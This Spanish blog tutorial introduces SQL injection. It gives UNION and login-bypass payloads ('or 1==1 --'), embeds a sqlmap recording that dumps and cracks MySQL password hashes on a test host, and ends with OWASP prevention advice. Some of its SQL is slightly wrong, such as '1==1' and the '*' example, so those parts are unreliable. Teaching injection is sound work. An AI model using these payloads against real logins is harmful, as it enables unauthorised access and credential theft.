---
layout: post
category: red
tags: SQL SQLi Penstesting OWASP
author: RedDev
SQL Injection For Dummies: Bypasseando el Login
---

### ¿Qué es SQL Injection?
SQL Injection es el nombre que se le da a las diversas técnicas utilizadas para dumpear o aprovechar vulnerabilidades relacionadas con bases de datos sql, ya sea por una mala gestión de ciertos carácteres especiales o por una mala consulta a la base de datos. 
Podemos considerar estas técnicas como las madres de otras técnicas como NoSQLi.

### ¿Cómo puedo realizar estas técnicas?

Primero debemos comprender como funcionan las consultas que se realizan desde una app web hacia su base de datos.

De lado del cliente observaremos un formulario que tendrá uno o más inputs. Pero en el backend os encontraremos un programa que recoge lo introducido en el input y lo inserta en una consulta SQL.Por Ejemplo:

<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required></div>
<input type="submit">
</form>

```html
<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required></div>
<input type="submit">
</form>
```
Aquí tenemos un formulario que tiene id lola, por lo que imaginemos que es un buscador de usuarios por ejemplo. 
En el backend habría una query hacía la base de datos de este tipo:
```SQL
SELECT (lola) FROM USERS;
```
Si nosotros insertaramos '*' por ejemplo, la consulta quedaría de esta forma:

```SQL
SELECT * FROM USERS;
```
### Pongamonos el BlackHat
Es decir nos dumpearia la tabla USERS, pero hasta aquí no hay nada interesante, ya que el formulario nos devuelve información de los usuarios directamente.
Ahora imaginemos que lo que nos devuelve es información de un coche en una base de datos, entoneces nuestra query quedaría de esta forma:
```SQL
SELECT * FROM CARS WHERE NOMBRE LIKE '(lola)';
```
Ahora lo que nos interesa es sacar información de los usuarios, aunque estamos haciendo consultas a admin, por lo que utilizaremos carácteres especiales como '--'.
Con esto podríamos injectar el siguiente "payload":
lola -> [' UNION SELECT * FROM USERS --]
```SQL
SELECT * FROM CARS WHERE NOMBRE LIKE ' ' UNION SELECT * FROM USERS -- ';
```
Con el operador UNION, nos unira los resultados de los dos selects, ademas es importante insertando el cierre de comillas, nos saldremos del string y podremos realizar la otra query además los dos guiones en SQL comentan el resto de la línea.
Y de esta forma, desde un input que consulta coches podrémos dumpear la tabla de usuarios. Pero...¿Como podemos usar esto para por ejemplo bypasear un login?


### ByPass al login 

Lo primero que hay que entender es como funciona este tipo de logins:
<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required>
  ><input type="password" name="pass" id="pass" title="At least 3 characters" required></div>
<input type="submit">
</form>
```html
<form >
  <div><input type="text" name="q" id="lola" title="At least 3 characters" required>
  ><input type="password" name="pass" id="pass" title="At least 3 characters" required></div>
<input type="submit">
</form>
```
En el backend nos encontraríamos una query de este estilo:
```SQL
SELECT id,Nombre FROM USERS WHERE USERNAME LIKE '(lola)' AND PASSWORD LIKE '(pass)'
'''
En este caso nuestro payload tendría este estilo:
lola -> [' or 1==1 -- ]
Por lo que quedaría así nuestra query:
```SQL
SELECT id,Nombre FROM USERS WHERE USERNAME LIKE '' or 1==1 -- ' AND PASSWORD LIKE '(pass)'
'''
Esto lo que nos va a generar es una query que su where da siempre positivo, por lo que nos dará la primera cuenta registrada, la cual suele ser la id = 0 o 1 que suele ser el administrados de la web, y nos loguea como el.

![image](https://github.com/reycotallo98/reycotallo98.github.io/assets/images/SQL-Injection.jpg)
### Eres un Script Kiddle y no te apetece hacerlo a mano?

Pues he aquí la solucion [SQLMap](https://sqlmap.org/), esta herramienta, con los input de la web, automatiza el proceso de SQLInjection pudiendo incluso sacarte directamente una shell con control sobre el servidor que aloja la web.

<div class="iframe">
<div id="player" style="width: 100%"><div class="ap-wrapper" tabindex="-1"><div class="ap-player asciinema-theme-tango" style="width: 690px; height: 593.218px;"><pre class="ap-terminal ap-cursor ap-blink" style="width: 90ch; height: 40em; font-size: 90.3733%; line-height: 1.33333em;"><span class="ap-line" style="height: 1.33333em;"><span class="">web application technology: PHP 5.2.6, Apache 2.2.9                                       </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">back-end DBMS: MySQL 5.0                                                                  </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:17] [INFO] fetching database users password hashes</span><span class="">                                 </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">do you want to store hashes to a temporary file for eventual further processing with other</span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright"> tools [y/N] N                                                                            </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q</span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">] Y                                                                                       </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:17] [INFO] using hash method 'mysql_passwd'</span><span class=" ap-bright">                                        </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">what dictionary do you want to use?</span><span class="">                                                       </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">[1] default dictionary file '/home/stamparm/Dropbox/Work/sqlmap/txt/wordlist.zip' (press E</span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">nter)                                                                                     </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">[2] custom dictionary file                                                                </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">[3] file with list of dictionary files                                                    </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">&gt; 1                                                                                       </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:17] [INFO] using default dictionary</span><span class=" ap-bright">                                                </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" ap-bright">do you want to use common password suffixes? (slow!) [y/N] N</span><span class="">                              </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:17] [INFO] starting dictionary-based cracking (mysql_passwd)</span><span class=" ap-bright">                       </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:17] [INFO] starting 8 processes </span><span class="">                                                   </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:20] [INFO] cracked password 'testpass' for user 'root'</span><span class="">                             </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">database management system users password hashes:                                        </span><span class=" fg-2"> </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">[*] debian-sys-maint [1]:                                                                 </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">    password hash: *6B2C58EABD91C1776DA223B088B601604F898847                              </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">[*] root [1]:                                                                             </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29                              </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">    clear-text password: testpass                                                         </span></span><span class="ap-line" style="height: 1.33333em;"><span class="">                                                                                          </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">[17:22:21] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/d</span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-2">ebiandev'                                                                                 </span></span><span class="ap-line" style="height: 1.33333em;"><span class=" fg-9 ap-bright">stamparm@beast</span><span class="">:</span><span class=" fg-12 ap-bright">~/Dropbox/Work/sqlmap</span><span class="">$ python sqlmap.py -u "http://debiandev/sqlmap/mysql/g</span></span><span class="ap-line" style="height: 1.33333em;"><span class="">et_int.php?id=1" --batch --pas                                                            </span></span></pre><div class="ap-control-bar ap-seekable"><span class="ap-playback-button"><svg version="1.1" viewBox="0 0 12 12" class="ap-icon"><path d="M1,0 L11,6 L1,12 Z"></path></svg></span><span class="ap-timer"><span class="ap-time-elapsed">00:00</span><span class="ap-time-remaining">-00:59</span></span><span class="ap-progressbar"><span class="ap-bar"><span class="ap-gutter"><span class="ap-gutter-fill" style="width: 100%; transform: scaleX(0); transform-origin: left center;"></span></span></span></span><span class="ap-fullscreen-button" title="Toggle fullscreen mode"><svg version="1.1" viewBox="0 0 12 12" class="ap-icon"><path d="M12,0 L7,0 L9,2 L7,4 L8,5 L10,3 L12,5 Z"></path><path d="M0,12 L0,7 L2,9 L4,7 L5,8 L3,10 L5,12 Z"></path></svg><svg version="1.1" viewBox="0 0 12 12" class="ap-icon"><path d="M7,5 L7,0 L9,2 L11,0 L12,1 L10,3 L12,5 Z"></path><path d="M5,7 L0,7 L2,9 L0,11 L1,12 L3,10 L5,12 Z"></path></svg></span></div><div class="ap-overlay ap-overlay-start"><div class="ap-play-button"><div><span><svg version="1.1" viewBox="0 0 866.0254037844387 866.0254037844387" class="ap-icon"><defs><mask id="small-triangle-mask"><rect width="100%" height="100%" fill="white"></rect><polygon points="508.01270189221935 433.01270189221935, 208.0127018922194 259.8076211353316, 208.01270189221927 606.217782649107" fill="black"></polygon></mask></defs><polygon points="808.0127018922194 433.01270189221935, 58.01270189221947 -1.1368683772161603e-13, 58.01270189221913 866.0254037844386" mask="url(#small-triangle-mask)" fill="white" class="ap-play-btn-fill"></polygon><polyline points="481.2177826491071 333.0127018922194, 134.80762113533166 533.0127018922194" stroke="white" stroke-width="90" class="ap-play-btn-stroke"></polyline></svg></span></div></div></div></div></div></div>
<script>  window.players = window.players || new Map();
  window.players.set('player', {"author":"stamparm","author-img-url":"//gravatar.com/avatar/d8c10c134b6dd389ecbd13f5cfb77cc2?s=128&d=retro","author-url":"https://asciinema.org/~stamparm","cols":90,"customTerminalFontFamily":null,"fit":"width","idleTimeLimit":null,"markers":null,"poster":"data:text/plain,web application technology: PHP 5.2.6, Apache 2.2.9                                       \r\nback-end DBMS: MySQL 5.0                                                                  \r\n\u001B[32m[17:22:17] [INFO] fetching database users password hashes\u001B[0m\r\n\u001B[1mdo you want to store hashes to a temporary file for eventual further processing with other\u001B[0m\r\n\u001B[1m tools [y/N] N                                                                            \u001B[0m\r\n\u001B[1mdo you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q\u001B[0m\r\n\u001B[1m] Y                                                                                       \u001B[0m\r\n\u001B[32m[17:22:17] [INFO] using hash method 'mysql_passwd'\u001B[0m\u001B[1m                                        \u001B[0m\r\n\u001B[1mwhat dictionary do you want to use?\u001B[0m\r\n\u001B[1m[1] default dictionary file '/home/stamparm/Dropbox/Work/sqlmap/txt/wordlist.zip' (press E\u001B[0m\r\n\u001B[1mnter)                                                                                     \u001B[0m\r\n\u001B[1m[2] custom dictionary file                                                                \u001B[0m\r\n\u001B[1m[3] file with list of dictionary files                                                    \u001B[0m\r\n\u001B[1m> 1                                                                                       \u001B[0m\r\n\u001B[32m[17:22:17] [INFO] using default dictionary\u001B[0m\u001B[1m                                                \u001B[0m\r\n\u001B[1mdo you want to use common password suffixes? (slow!) [y/N] N\u001B[0m\r\n\u001B[32m[17:22:17] [INFO] starting dictionary-based cracking (mysql_passwd)\u001B[0m\u001B[1m                       \u001B[0m\r\n\u001B[32m[17:22:17] [INFO] starting 8 processes \u001B[0m\r\n\u001B[32m[17:22:20] [INFO] cracked password 'testpass' for user 'root'\u001B[0m\r\ndatabase management system users password hashes:                                        \u001B[32m \u001B[0m\r\n[*] debian-sys-maint [1]:                                                                 \r\n    password hash: *6B2C58EABD91C1776DA223B088B601604F898847                              \r\n[*] root [1]:                                                                             \r\n    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29                              \r\n    clear-text password: testpass                                                         \r\n                                                                                          \r\n\u001B[32m[17:22:21] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/d\u001B[0m\r\n\u001B[32mebiandev'                                                                                 \u001B[0m\r\n\u001B[1;31mstamparm@beast\u001B[0m:\u001B[1;34m~/Dropbox/Work/sqlmap\u001B[0m$ python sqlmap.py -u \"http://debiandev/sqlmap/mysql/g\r\net_int.php?id=1\" --batch --pas                                                            \u001B[?25l","preload":true,"rows":30,"src":"https://asciinema.org/a/46601.json","terminalLineHeight":null,"theme":"tango","title":"Sample sqlmap run"});
</script>
<p class="powered">
  Recorded with <a href="https://asciinema.org" target="_top">asciinema</a>
</p>

    <script src="/js/iframe-394b12e5129278e3923ab2672468dc23.js?vsn=d"></script>
  
</div>

### ¿Cómo puedo evitar esto en mi web?
 Segun la organización [OWASP](https://owasp.org/www-community/attacks/SQL_Injection), se recomienda:
 - Usar Prepared Statements con querys parametrizadas.
 - Usar constructores con procesos de alamacenamiento adecuados
 - Validacion de los inputs
 
 Para más información -> [Cheatsheet OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 
 

